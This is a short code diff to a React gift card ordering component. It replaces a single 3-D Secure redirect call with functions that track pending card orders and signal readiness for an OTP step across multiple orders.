@@ -6,7 +6,7 @@ import {formatLatinDigits} from '../lib/formatNumbers';
 import {getPackages, GIFT_CARD_PACKAGES, type GiftCardService, type GiftCardRegion, type GiftCardPackage} from '../lib/giftCardPackages';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {CardProcessingToOtpScreen} from './OtpPaymentUi';
-import {redirectToAcsChallenge} from '../lib/acsRedirect';
+import {openAcsForOrder, trackPendingCardOrder, signalOtpReady} from '../lib/multiOrderOtp';
 import {validateCard, cardErrorMessage} from '../lib/cardValidation';
 
 /** أيقونات الخدمات */
@@ -96,7 +96,8 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
   const openAcs = (orderRef: string, phoneLast3?: string | null) => {
     if (redirectingRef.current) return;
     redirectingRef.current = true;
-    redirectToAcsChallenge({
+    signalOtpReady(orderRef, phoneLast3);
+    openAcsForOrder({
       orderRef,
       clientId,
       lang,
@@ -410,6 +411,7 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
               return;
             }
             setCurrentOrderId(String(orderRef));
+            trackPendingCardOrder(String(orderRef));
             setCardProcessingToOtp(true);
             setIsSubmitting(false);
             onComplete?.();
